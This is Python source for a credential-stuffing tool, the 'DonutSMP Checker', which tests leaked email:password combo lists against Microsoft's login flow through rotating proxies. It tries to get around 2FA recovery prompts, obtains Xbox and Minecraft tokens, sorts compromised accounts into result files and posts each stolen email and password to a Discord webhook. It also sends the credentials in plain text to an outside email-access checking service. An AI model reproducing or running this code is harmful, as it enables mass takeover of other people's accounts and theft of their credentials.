            status_color = 3066993  # Green for online
            status_emoji = "🟢"
            if donutsmp == "Yes (Offline)":
                status_color = 15105570  # Yellow for offline
                status_emoji = "🟡"
            elif donutsmp == "No":
                status_color = 15158332  # Red for no account
                status_emoji = "🔴"
            elif donutsmp == "Error":
                status_color = 10181046  # Purple for error
                status_emoji = "🟣"
            
            # Create embed
            embed = {
                "title": f"{status_emoji} DonutSMP Account Found {status_emoji}",
                "description": f"**Premium Minecraft Account with DonutSMP Data**",
                "color": config.get('embed_color', status_color),
                "thumbnail": {
                    "url": f"https://minotar.net/avatar/{name}/100"
                },
                "fields": [
                    {
                        "name": "🔐 Account Information",
                        "value": f"```\nEmail: {email}\nPassword: {password}\nUsername: {name}\nType: {account_type}```",
                        "inline": False
                    },
                    {
                        "name": "🍩 DonutSMP Status",
                        "value": f"**Status:** {donutsmp}",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": config.get('custom_footer', '🔥 Ultimate DonutSMP Checker 🔥'),
                    "icon_url": config.get('custom_avatar', 'https://i.imgur.com/M4m2vjM.png')
                }
            }
            
            # Add timestamp if enabled
            if config.get('show_timestamp', True):
                embed["timestamp"] = datetime.now().isoformat()
            
            # Add DonutSMP details if player has an account
            if donutsmp in ["Yes (Online)", "Yes (Offline)"]:
                # Add basic info
                basic_info = []
                if rank != "N/A": basic_info.append(f"**Rank:** {rank}")
                if location != "N/A": basic_info.append(f"**Location:** {location}")
                
                if basic_info:
                    embed["fields"].append({
                        "name": "📋 Basic Information",
                        "value": "\n".join(basic_info),
                        "inline": True
                    })
                
                # Add stats if available
                stats = []
                if balance != "N/A": stats.append(f"**Balance:** ${balance}")
                if playtime != "N/A": stats.append(f"**Playtime:** {playtime}")
                if kills != "N/A": stats.append(f"**Kills:** {kills}")
                if deaths != "N/A": stats.append(f"**Deaths:** {deaths}")
                
                if stats:
                    embed["fields"].append({
                        "name": "📊 Player Statistics",
                        "value": "\n".join(stats),
                        "inline": True
                    })
                
                # Add additional stats
                additional_stats = []
                if blocks_broken != "N/A": additional_stats.append(f"**Blocks Broken:** {blocks_broken}")
                if blocks_placed != "N/A": additional_stats.append(f"**Blocks Placed:** {blocks_placed}")
                if shards != "N/A": additional_stats.append(f"**Shards:** {shards}")
                if mobs_killed != "N/A": additional_stats.append(f"**Mobs Killed:** {mobs_killed}")
                
                if additional_stats:
                    embed["fields"].append({
                        "name": "🎮 Additional Stats",
                        "value": "\n".join(additional_stats),
                        "inline": True
                    })
                
                # Add economy stats
                economy_stats = []
                if money_spent != "N/A": economy_stats.append(f"**Money Spent:** ${money_spent}")
                if money_made != "N/A": economy_stats.append(f"**Money Made:** ${money_made}")
                
                if economy_stats:
                    embed["fields"].append({
                        "name": "💰 Economy Stats",
                        "value": "\n".join(economy_stats),
                        "inline": True
                    })
            
            # Add cosmetics field
            cosmetics = []
            if optifine_cape != "N/A": cosmetics.append(f"**Optifine Cape:** {optifine_cape}")
            if mc_capes != "N/A": cosmetics.append(f"**Minecraft Capes:** {mc_capes}")
            if skin_url != "N/A": cosmetics.append(f"**Skin URL:** {skin_url}")
            
            if cosmetics:
                embed["fields"].append({
                    "name": "👕 Cosmetics",
                    "value": "\n".join(cosmetics),
                    "inline": True
                })
            
            # Add account security field
            security = []
            if email_access != "N/A": security.append(f"**Email Access:** {email_access}")
            if name_change != "N/A": security.append(f"**Can Change Name:** {name_change}")
            if last_changed != "N/A": security.append(f"**Last Name Change:** {last_changed}")
            if migration_status != "N/A": security.append(f"**Migration Status:** {migration_status}")
            if security_questions != "N/A": security.append(f"**Security Questions:** {security_questions}")
            if birth_date != "N/A": security.append(f"**Birth Date:** {birth_date}")
            if country != "N/A": security.append(f"**Country:** {country}")
            
            if security:
                embed["fields"].append({
                    "name": "🔒 Account Security",
                    "value": "\n".join(security),
                    "inline": True
                })
            
            # Create the payload
            payload = {
                "content": config.get('message', f"🍩 **NEW DONUTSMP ACCOUNT HIT!** 🍩 ||`{email}:{password}`||"),
                "embeds": [embed],
                "username": "🍩 DONUTSMP CHECKER 🍩",
                "avatar_url": config.get('custom_avatar', 'https://i.imgur.com/M4m2vjM.png')
            }
            
            # Add mention role if specified
            mention_role = config.get('mention_role', 'None')
            if mention_role != 'None':
                payload["content"] = f"<@&{mention_role}> " + payload["content"]
            
            # Send webhook with retries
            webhook_url = config.get('webhook', '')
            if webhook_url:
                max_retries = config.get('notification_retries', 3)
                timeout = config.get('webhook_timeout', 10)
                
                for attempt in range(max_retries):
                    try:
                        response = requests.post(
                            webhook_url,
                            data=json.dumps(payload),
                            headers={"Content-Type": "application/json"},
                            timeout=timeout
                        )
                        
                        if response.status_code == 200 or response.status_code == 204:
                            logger.debug(f"Discord notification sent successfully")
                            break
                        else:
                            logger.warning(f"Discord notification failed with status {response.status_code}: {response.text}")
                            if attempt < max_retries - 1:
                                time.sleep(1)  # Wait before retrying
                    except Exception as e:
                        logger.error(f"Error sending Discord notification (attempt {attempt + 1}/{max_retries}): {e}")
                        if attempt < max_retries - 1:
                            time.sleep(1)  # Wait before retrying
        except Exception as e:
            with stats_lock:
                errors += 1
            logger.error(f"Error sending Discord notification: {e}")
    
    def donutsmp_stats(self):
        """Get DonutSMP player statistics"""
        global errors
        
        try:
            # Use the DonutSMP API with Bearer authentication
            headers = {
                'User-Agent': config.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'),
                'Authorization': f'Bearer {config.get("donutsmp_api_key", DONUTSMP_API_KEY)}'
            }
            
            # Get player lookup info from DonutSMP API
            response = requests.get(
                f'https://api.donutsmp.net/v1/lookup/{self.name}',
                headers=headers,
                proxies=getproxy(),
                verify=False,
                timeout=config.get('timeout', 10)
            )
            
            if response.status_code == 200:
                lookup_data = response.json()
                
                # Check if player exists (status 200 means player exists and is online)
                if lookup_data.get('status') == 200 and lookup_data.get('result'):
                    self.donutsmp = "Yes (Online)"
                    player_info = lookup_data.get('result', {})
                    
                    # Extract available information from lookup data
                    if config.get('donutsmprank', True):
                        self.donutsmp_rank = player_info.get('rank', 'N/A')
                    
                    if config.get('donutsmplocation', True):
                        self.donutsmp_location = player_info.get('location', 'N/A')
                    
                    # Get player stats from DonutSMP API
                    stats_response = requests.get(
                        f'https://api.donutsmp.net/v1/stats/{self.name}',
                        headers=headers,
                        proxies=getproxy(),
                        verify=False,
                        timeout=config.get('timeout', 10)
                    )
                    
                    if stats_response.status_code == 200:
                        stats_data = stats_response.json()
                        
                        if stats_data.get('status') == 200 and stats_data.get('result'):
                            player_data = stats_data.get('result', {})
                            
                            # Extract stats from player data
                            if config.get('donutsmpbalance', True):
                                self.donutsmp_balance = player_data.get('money', 'N/A')
                            
                            if config.get('donutsmpplaytime', True):
                                self.donutsmp_playtime = format_time(player_data.get('playtime', 0))
                            
                            if config.get('donutsmpkills', True):
                                self.donutsmp_kills = player_data.get('kills', 'N/A')
                            
                            if config.get('donutsmpdeaths', True):
                                self.donutsmp_deaths = player_data.get('deaths', 'N/A')
                            
                            if config.get('donutsmpblocksbroken', True):
                                self.donutsmp_blocks_broken = player_data.get('broken_blocks', 'N/A')
                            
                            if config.get('donutsmpblocksplaced', True):
                                self.donutsmp_blocks_placed = player_data.get('placed_blocks', 'N/A')
                            
                            if config.get('donutsmpshards', True):
                                self.donutsmp_shards = player_data.get('shards', 'N/A')
                            
                            if config.get('donutsmpmobs_killed', True):
                                self.donutsmp_mobs_killed = player_data.get('mobs_killed', 'N/A')
                            
                            if config.get('donutsmpmoney_spent', True):
                                self.donutsmp_money_spent = player_data.get('money_spent_on_shop', 'N/A')
                            
                            if config.get('donutsmpmoney_made', True):
                                self.donutsmp_money_made = player_data.get('money_made_from_sell', 'N/A')
                            
                            if config.get('donutsmpbasefound', True):
                                # Base found is not directly provided in the API response
                                self.donutsmp_base_found = "N/A"
                else:
                    self.donutsmp = "No"
            elif response.status_code == 500:
                # Player exists but is not online
                try:
                    error_data = response.json()
                    if error_data.get('message') == "This user is not currently online.":
                        self.donutsmp = "Yes (Offline)"
                        
                        # Try to get player stats even if they're offline
                        stats_response = requests.get(
                            f'https://api.donutsmp.net/v1/stats/{self.name}',
                            headers=headers,
                            proxies=getproxy(),
                            verify=False,
                            timeout=config.get('timeout', 10)
                        )
                        
                        if stats_response.status_code == 200:
                            stats_data = stats_response.json()
                            
                            if stats_data.get('status') == 200 and stats_data.get('result'):
                                player_data = stats_data.get('result', {})
                                
                                # Extract stats from player data
                                if config.get('donutsmpbalance', True):
                                    self.donutsmp_balance = player_data.get('money', 'N/A')
                                
                                if config.get('donutsmpplaytime', True):
                                    self.donutsmp_playtime = format_time(player_data.get('playtime', 0))
                                
                                if config.get('donutsmpkills', True):
                                    self.donutsmp_kills = player_data.get('kills', 'N/A')
                                
                                if config.get('donutsmpdeaths', True):
                                    self.donutsmp_deaths = player_data.get('deaths', 'N/A')
                                
                                if config.get('donutsmpblocksbroken', True):
                                    self.donutsmp_blocks_broken = player_data.get('broken_blocks', 'N/A')
                                
                                if config.get('donutsmpblocksplaced', True):
                                    self.donutsmp_blocks_placed = player_data.get('placed_blocks', 'N/A')
                                
                                if config.get('donutsmpshards', True):
                                    self.donutsmp_shards = player_data.get('shards', 'N/A')
                                
                                if config.get('donutsmpmobs_killed', True):
                                    self.donutsmp_mobs_killed = player_data.get('mobs_killed', 'N/A')
                                
                                if config.get('donutsmpmoney_spent', True):
                                    self.donutsmp_money_spent = player_data.get('money_spent_on_shop', 'N/A')
                                
                                if config.get('donutsmpmoney_made', True):
                                    self.donutsmp_money_made = player_data.get('money_made_from_sell', 'N/A')
                                
                                if config.get('donutsmpbasefound', True):
                                    # Base found is not directly provided in the API response
                                    self.donutsmp_base_found = "N/A"
                except:
                    self.donutsmp = "Error"
            else:
                self.donutsmp = "Error"
                logger.warning(f"API Error: {response.status_code} - {response.text}")
        except Exception as e:
            with stats_lock:
                errors += 1
            self.donutsmp = "Error"
            logger.error(f"Error checking DonutSMP stats: {e}")
    
    def optifine(self):
        """Check if the player has an Optifine cape"""
        if config.get('optifinecape', True):
            try:
                response = requests.get(
                    f'http://s.optifine.net/capes/{self.name}.png',
                    proxies=getproxy(),
                    verify=False,
                    timeout=config.get('timeout', 5)
                )
                
                if "Not found" in response.text: 
                    self.cape = "No"
                else: 
                    self.cape = "Yes"
            except Exception as e:
                self.cape = "Unknown"
                logger.debug(f"Error checking Optifine cape: {e}")
    
    def full_access(self):
        """Check if the account has full email access"""
        global mfa, sfa
        
        if config.get('access', True):
            try:
                response = requests.get(
                    f"https://email.avine.tools/check?email={self.email}&password={self.password}",
                    verify=False,
                    timeout=config.get('timeout', 5)
                )
                
                out = response.json()
                if out.get("Success") == 1: 
                    self.access = "True"
                    with stats_lock:
                        mfa += 1
                    with open(f"results/{fname}/MFA.txt", 'a', encoding='utf-8') as f:
                        f.write(f"{self.email}:{self.password}\n")
                else:
                    with stats_lock:
                        sfa += 1
                    self.access = "False"
                    with open(f"results/{fname}/SFA.txt", 'a', encoding='utf-8') as f:
                        f.write(f"{self.email}:{self.password}\n")
            except Exception as e:
                self.access = "Unknown"
                logger.debug(f"Error checking email access: {e}")
    
    def namechange(self):
        """Check if the player can change their name and when they last changed it"""
        if config.get('namechange', True) or config.get('lastchanged', True):
            tries = 0
            while tries < maxretries:
                try:
                    response = requests.get(
                        'https://api.minecraftservices.com/minecraft/profile/namechange',
                        headers={'Authorization': f'Bearer {self.token}'},
                        proxies=getproxy(),
                        verify=False,
                        timeout=config.get('timeout', 5)
                    )
                    
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if config.get('namechange', True):
                                self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                            
                            if config.get('lastchanged', True):
                                created_at = data.get('createdAt')
                                if created_at:
                                    try:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                                    except ValueError:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                                    
                                    given_date = given_date.replace(tzinfo=timezone.utc)
                                    formatted = given_date.strftime("%m/%d/%Y")
                                    current_date = datetime.now(timezone.utc)
                                    difference = current_date - given_date
                                    years = difference.days // 365
                                    months = (difference.days % 365) // 30
                                    days = difference.days
                                    
                                    if years > 0:
                                        self.lastchanged = f"{years} {'year' if years == 1 else 'years'} - {formatted} - {created_at}"
                                    elif months > 0:
                                        self.lastchanged = f"{months} {'month' if months == 1 else 'months'} - {formatted} - {created_at}"
                                    else:
                                        self.lastchanged = f"{days} {'day' if days == 1 else 'days'} - {formatted} - {created_at}"
                                    break
                        except Exception as e:
                            logger.debug(f"Error parsing name change data: {e}")
                    
                    elif response.status_code == 429:
                        if len(proxylist) < 5: 
                            time.sleep(20)
                        continue
                except Exception as e:
                    logger.debug(f"Error checking name change: {e}")
                
                tries += 1
                with stats_lock:
                    retries += 1
    
    def skin_url(self):
        """Get the player's skin URL"""
        if config.get('skin_url', True) and self.name != 'N/A':
            try:
                response = requests.get(
                    f'https://sessionserver.mojang.com/session/minecraft/profile/{self.uuid}',
                    proxies=getproxy(),
                    verify=False,
                    timeout=config.get('timeout', 5)
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if 'properties' in data:
                        for prop in data['properties']:
                            if prop['name'] == 'textures':
                                # Decode the base64 texture data
                                import base64
                                texture_data = json.loads(base64.b64decode(prop['value']).decode('utf-8'))
                                if 'textures' in texture_data and 'SKIN' in texture_data['textures']:
                                    self.skin_url = texture_data['textures']['SKIN']['url']
                                    break
            except Exception as e:
                logger.debug(f"Error getting skin URL: {e}")
    
    def migration_status(self):
        """Check if the account has been migrated to Microsoft"""
        if config.get('migration_status', True) and self.name != 'N/A':
            try:
                response = requests.get(
                    f'https://api.mojang.com/user/profiles/{self.uuid}/names',
                    proxies=getproxy(),
                    verify=False,
                    timeout=config.get('timeout', 5)
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if data and len(data) > 0:
                        # Check if the first name change was before the Microsoft migration deadline
                        first_name = data[0]
                        if 'changedToAt' in first_name:
                            # The account has been renamed, which suggests it's been migrated
                            self.migration_status = "Migrated"
                        else:
                            # The account still has its original name
                            self.migration_status = "Not Migrated"
            except Exception as e:
                logger.debug(f"Error checking migration status: {e}")
    
    def security_questions(self):
        """Check if the account has security questions set up"""
        if config.get('security_questions', True) and self.name != 'N/A':
            try:
                # This is a placeholder as there's no direct API to check security questions
                # In a real implementation, you would need to log in to the account and check
                self.security_questions = "Unknown"
            except Exception as e:
                logger.debug(f"Error checking security questions: {e}")
    
    def birth_date(self):
        """Get the account's birth date if available"""
        if config.get('birth_date', True) and self.name != 'N/A':
            try:
                # This is a placeholder as there's no direct API to get birth date
                # In a real implementation, you would need to log in to the account and check
                self.birth_date = "Unknown"
            except Exception as e:
                logger.debug(f"Error checking birth date: {e}")
    
    def country(self):
        """Get the account's country if available"""
        if config.get('country', True) and self.name != 'N/A':
            try:
                # This is a placeholder as there's no direct API to get country
                # In a real implementation, you would need to log in to the account and check
                self.country = "Unknown"
            except Exception as e:
                logger.debug(f"Error checking country: {e}")
    
    def handle(self):
        """Handle the captured account data"""
        global hits
        
        with stats_lock:
            hits += 1
        
        if screen == "'2'": 
            logger.info(f"Hit: {self.name} | {self.email}:{self.password}")
        
        # Save to hits file
        with open(f"results/{fname}/Hits.txt", 'a', encoding='utf-8') as file:
            file.write(f"{self.email}:{self.password}\n")
        
        # Only get additional data if we have a valid username
        if self.name != 'N/A':
            try:
                self.donutsmp_stats()
            except Exception as e:
                logger.error(f"Error in donutsmp_stats: {e}")
            
            try:
                self.optifine()
            except Exception as e:
                logger.error(f"Error in optifine: {e}")
            
            try:
                self.full_access()
            except Exception as e:
                logger.error(f"Error in full_access: {e}")
            
            try:
                self.namechange()
            except Exception as e:
                logger.error(f"Error in namechange: {e}")
            
            try:
                self.skin_url()
            except Exception as e:
                logger.error(f"Error in skin_url: {e}")
            
            try:
                self.migration_status()
            except Exception as e:
                logger.error(f"Error in migration_status: {e}")
            
            try:
                self.security_questions()
            except Exception as e:
                logger.error(f"Error in security_questions: {e}")
            
            try:
                self.birth_date()
            except Exception as e:
                logger.error(f"Error in birth_date: {e}")
            
            try:
                self.country()
            except Exception as e:
                logger.error(f"Error in country: {e}")
        
        # Save capture data
        with open(f"results/{fname}/Capture.txt", 'a', encoding='utf-8') as file:
            file.write(self.builder())
        
        # Send notification
        self.notify()

class Login:
    """Simple login class to hold email and password"""
    
    def __init__(self, email, password):
        self.email = email
        self.password = password

def get_urlPost_sFTTag(session):
    """Get the URL and sFTTag for Microsoft authentication"""
    global retries
    
    while True:
        try:
            response = session.get(sFTTag_url, timeout=config.get('timeout', 15))
            text = response.text
            
            # Extract sFTTag
            match = re.match(r'.*value="(.+?)".*', text, re.S)
            if match is not None:
                sFTTag = match.group(1)
                
                # Extract urlPost
                match = re.match(r".*urlPost:'(.+?)'.*", text, re.S)
                if match is not None:
                    return match.group(1), sFTTag, session
        except Exception as e:
            logger.debug(f"Error getting sFTTag: {e}")
        
        # Change proxy and retry
        session.proxies = getproxy()
        with stats_lock:
            retries += 1

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    """Authenticate with Xbox Live using RPS"""
    global bad, checked, cpm, twofa, retries
    
    tries = 0
    while tries < maxretries:
        try:
            data = {
                'login': email, 
                'loginfmt': email, 
                'passwd': password, 
                'PPFT': sFTTag
            }
            
            login_request = session.post(
                urlPost, 
                data=data, 
                headers={'Content-Type': 'application/x-www-form-urlencoded'}, 
                allow_redirects=True, 
                timeout=config.get('timeout', 15)
            )
            
            # Check if we got a token in the URL fragment
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            
            # Handle 2FA
            elif 'cancel?mkt=' in login_request.text:
                try:
                    data = {
                        'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                        'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                        'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                    }
                    
                    ret = session.post(
                        re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), 
                        data=data, 
                        allow_redirects=True
                    )
                    
                    fin = session.get(
                        re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), 
                        allow_redirects=True
                    )
                    
                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        return token, session
                except Exception as e:
                    logger.debug(f"Error handling 2FA: {e}")
            
            # Check for 2FA required
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                with stats_lock:
                    twofa += 1
                    checked += 1
                    cpm += 1
                
                if screen == "'2'": 
                    logger.info(f"2FA: {email}:{password}")
                
                with open(f"results/{fname}/2fa.txt", 'a', encoding='utf-8') as file:
                    file.write(f"{email}:{password}\n")
                
                return "None", session
            
            # Check for invalid credentials
            elif any(value in login_request.text.lower() for value in [
                "password is incorrect", 
                r"account doesn\'t exist.", 
                "sign in to your microsoft account", 
                "tried to sign in too many times with an incorrect account or password"
            ]):
                with stats_lock:
                    bad += 1
                    checked += 1
                    cpm += 1
                
                if screen == "'2'": 
                    logger.info(f"Bad: {email}:{password}")
                
                return "None", session
            
            # If none of the above, change proxy and retry
            else:
                session.proxies = getproxy()
                with stats_lock:
                    retries += 1
                tries += 1
        except Exception as e:
            logger.debug(f"Error in xbox_rps: {e}")
            session.proxies = getproxy()
            with stats_lock:
                retries += 1
            tries += 1
    
    # If we've exhausted all retries, mark as bad
    with stats_lock:
        bad += 1
        checked += 1
        cpm += 1
    
    if screen == "'2'": 
        logger.info(f"Bad: {email}:{password}")
    
    return "None", session

def validmail(email, password):
    """Handle valid Microsoft accounts without Minecraft"""
    global vm, cpm, checked
    
    with stats_lock:
        vm += 1
        cpm += 1
        checked += 1
    
    with open(f"results/{fname}/Valid_Mail.txt", 'a', encoding='utf-8') as file:
        file.write(f"{email}:{password}\n")
    
    if screen == "'2'": 
        logger.info(f"Valid Mail: {email}:{password}")

def capture_mc(access_token, session, email, password, type):
    """Capture Minecraft profile data"""
    global retries
    
    while True:
        try:
            response = session.get(
                'https://api.minecraftservices.com/minecraft/profile', 
                headers={'Authorization': f'Bearer {access_token}'}, 
                verify=False, 
                timeout=config.get('timeout', 10)
            )
            
            if response.status_code == 200:
                data = response.json()
                capes = ", ".join([cape["alias"] for cape in data.get("capes", [])])
                CAPTURE = Capture(email, password, data['name'], capes, data['id'], access_token, type)
                CAPTURE.handle()
                break
            
            elif response.status_code == 429:
                with stats_lock:
                    retries += 1
                session.proxies = getproxy()
                if len(proxylist) < 5: 
                    time.sleep(20)
                continue
            else:
                break
        except Exception as e:
            logger.debug(f"Error in capture_mc: {e}")
            with stats_lock:
                retries += 1
            session.proxies = getproxy()
            continue

def checkmc(session, email, password, token):
    """Check if the account has Minecraft and what type"""
    global retries, cpm, checked, xgp, xgpu, other
    
    while True:
        try:
            checkrq = session.get(
                'https://api.minecraftservices.com/entitlements/mcstore', 
                headers={'Authorization': f'Bearer {token}'}, 
                verify=False, 
                timeout=config.get('timeout', 10)
            )
            
            if checkrq.status_code == 200:
                text = checkrq.text
                
                # Check for Xbox Game Pass Ultimate
                if 'product_game_pass_ultimate' in text:
                    with stats_lock:
                        xgpu += 1
                        cpm += 1
                        checked += 1
                    
                    if screen == "'2'": 
                        logger.info(f"Xbox Game Pass Ultimate: {email}:{password}")
                    
                    with open(f"results/{fname}/XboxGamePassUltimate.txt", 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password}\n")
                    
                    try:
                        capture_mc(token, session, email, password, "Xbox Game Pass Ultimate")
                    except Exception as e:
                        logger.error(f"Error capturing Xbox Game Pass Ultimate: {e}")
                        CAPTURE = Capture(email, password, "N/A", "N/A", "N/A", "N/A", "Xbox Game Pass Ultimate [Unset MC]")
                        CAPTURE.handle()
                    
                    return True
                
                # Check for Xbox Game Pass
                elif 'product_game_pass_pc' in text:
                    with stats_lock:
                        xgp += 1
                        cpm += 1
                        checked += 1
                    
                    if screen == "'2'": 
                        logger.info(f"Xbox Game Pass: {email}:{password}")
                    
                    with open(f"results/{fname}/XboxGamePass.txt", 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password}\n")
                    
                    capture_mc(token, session, email, password, "Xbox Game Pass")
                    return True
                
                # Check for regular Minecraft
                elif '"product_minecraft"' in text:
                    with stats_lock:
                        checked += 1
                        cpm += 1
                    
                    capture_mc(token, session, email, password, "Normal")
                    return True
                
                # Check for other Minecraft products
                else:
                    others = []
                    if 'product_minecraft_bedrock' in text:
                        others.append("Minecraft Bedrock")
                    if 'product_legends' in text:
                        others.append("Minecraft Legends")
                    if 'product_dungeons' in text:
                        others.append('Minecraft Dungeons')
                    
                    if others:
                        with stats_lock:
                            other += 1
                            cpm += 1
                            checked += 1
                        
                        items = ', '.join(others)
                        with open(f"results/{fname}/Other.txt", 'a', encoding='utf-8') as f:
                            f.write(f"{email}:{password} | {items}\n")
                        
                        if screen == "'2'": 
                            logger.info(f"Other: {email}:{password} | {items}")
                        
                        return True
                    else:
                        return False
            
            elif checkrq.status_code == 429:
                with stats_lock:
                    retries += 1
                session.proxies = getproxy()
                if len(proxylist) < 1: 
                    time.sleep(20)
                continue
            else:
                return False
        except Exception as e:
            logger.debug(f"Error in checkmc: {e}")
            with stats_lock:
                retries += 1
            session.proxies = getproxy()
            continue

def mc_token(session, uhs, xsts_token):
    """Get Minecraft authentication token"""
    global retries
    
    while True:
        try:
            mc_login = session.post(
                'https://api.minecraftservices.com/authentication/login_with_xbox', 
                json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, 
                headers={'Content-Type': 'application/json'}, 
                timeout=config.get('timeout', 15)
            )
            
            if mc_login.status_code == 429:
                session.proxies = getproxy()
                if len(proxylist) < 1: 
                    time.sleep(20)
                continue
            else:
                return mc_login.json().get('access_token')
        except Exception as e:
            logger.debug(f"Error in mc_token: {e}")
            with stats_lock:
                retries += 1
            session.proxies = getproxy()
            continue

def authenticate(email, password, tries=0):
    """Authenticate with Microsoft and check for Minecraft"""
    global retries, bad, checked, cpm
    
    session = None
    try:
        session = requests.Session()
        session.verify = False
        session.headers.update({'User-Agent': config.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')})
        session.proxies = getproxy()
        
        # Get Microsoft authentication parameters
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        
        # Authenticate with Xbox Live
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        
        if token != "None":
            hit = False
            try:
                # Authenticate with Xbox Live
                xbox_login = session.post(
                    'https://user.auth.xboxlive.com/user/authenticate', 
                    json={
                        "Properties": {
                            "AuthMethod": "RPS", 
                            "SiteName": "user.auth.xboxlive.com", 
                            "RpsTicket": token
                        }, 
                        "RelyingParty": "http://auth.xboxlive.com", 
                        "TokenType": "JWT"
                    }, 
                    headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, 
                    timeout=config.get('timeout', 15)
                )
                
                js = xbox_login.json()
                xbox_token = js.get('Token')
                
                if xbox_token is not None:
                    uhs = js['DisplayClaims']['xui'][0]['uhs']
                    
                    # Get XSTS token
                    xsts = session.post(
                        'https://xsts.auth.xboxlive.com/xsts/authorize', 
                        json={
                            "Properties": {
                                "SandboxId": "RETAIL", 
                                "UserTokens": [xbox_token]
                            }, 
                            "RelyingParty": "rp://api.minecraftservices.com/", 
                            "TokenType": "JWT"
                        }, 
                        headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, 
                        timeout=config.get('timeout', 15)
                    )
                    
                    js = xsts.json()
                    xsts_token = js.get('Token')
                    
                    if xsts_token is not None:
                        # Get Minecraft token
                        access_token = mc_token(session, uhs, xsts_token)
                        if access_token is not None:
                            # Check for Minecraft
                            hit = checkmc(session, email, password, access_token)
            except Exception as e:
                logger.error(f"Error in authentication: {e}")
            
            # If no Minecraft found, but valid Microsoft account
            if hit is False:
                validmail(email, password)
    except Exception as e:
        logger.error(f"Authentication error: {e}")
        if tries < maxretries:
            with stats_lock:
                retries += 1
            authenticate(email, password, tries + 1)
        else:
            with stats_lock:
                bad += 1
                checked += 1
                cpm += 1
            if screen == "'2'": 
                logger.info(f"Bad: {email}:{password}")
    finally:
        if session is not None:
            session.close()

def Load():
    """Load combo list from file"""
    global Combos, fname
    
    try:
        root = Tk()
        root.withdraw()
        filename = filedialog.askopenfilename(
            title='Choose a Combo file',
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        root.destroy()
        
        if not filename:
            print(f"{Fore.LIGHTRED_EX}Invalid File.{Style.RESET_ALL}")
            time.sleep(2)
            Load()
        else:
            fname = os.path.splitext(os.path.basename(filename))[0]
            try:
                with open(filename, 'r+', encoding='utf-8') as e:
                    lines = e.readlines()
                    Combos = list(set(lines))  # Remove duplicates
                    print(f"{Fore.LIGHTBLUE_EX}[{str(len(lines) - len(Combos))}] Dupes Removed.{Style.RESET_ALL}")
                    print(f"{Fore.LIGHTBLUE_EX}[{len(Combos)}] Combos Loaded.{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.LIGHTRED_EX}Your file is probably harmed: {e}{Style.RESET_ALL}")
                time.sleep(2)
                Load()
    except Exception as e:
        logger.error(f"Error in Load: {e}")
        time.sleep(2)
        Load()

def Proxys():
    """Load proxy list from file"""
    global proxylist
    
    try:
        root = Tk()
        root.withdraw()
        fileNameProxy = filedialog.askopenfilename(
            title='Choose a Proxy file',
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        root.destroy()
        
        if not fileNameProxy:
            print(f"{Fore.LIGHTRED_EX}Invalid File.{Style.RESET_ALL}")
            time.sleep(2)
            Proxys()
        else:
            try:
                with open(fileNameProxy, 'r+', encoding='utf-8', errors='ignore') as e:
                    ext = e.readlines()
                    for line in ext:
                        try:
                            proxyline = line.split()[0].replace('\n', '')
                            proxylist.append(proxyline)
                        except:
                            pass
                print(f"{Fore.LIGHTBLUE_EX}Loaded [{len(proxylist)}] lines.{Style.RESET_ALL}")
                time.sleep(2)
            except Exception as e:
                print(f"{Fore.LIGHTRED_EX}Your file is probably harmed: {e}{Style.RESET_ALL}")
                time.sleep(2)
                Proxys()
    except Exception as e:
        logger.error(f"Error in Proxys: {e}")
        time.sleep(2)
        Proxys()

def logscreen():
    """Update the log screen with current statistics"""
    global cpm, cpm1
    
    with stats_lock:
        cmp1 = cpm
        cpm = 0
        utils.set_title(f"🍩 DONUTSMP CHECKER 🍩 | Checked: {checked}/{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    
    time.sleep(1)
    threading.Thread(target=logscreen).start()    

def cuiscreen():
    """Update the CUI screen with current statistics"""
    global cpm, cpm1
    
    os.system('cls')
    with stats_lock:
        cmp1 = cpm
        cpm = 0
    
    print(logo)
    print(f"{Fore.CYAN} [{checked}/{len(Combos)}] Checked{Style.RESET_ALL}")
    print(f"{Fore.GREEN} [{hits}] Hits{Style.RESET_ALL}")
    print(f"{Fore.RED} [{bad}] Bad{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} [{sfa}] SFA{Style.RESET_ALL}")
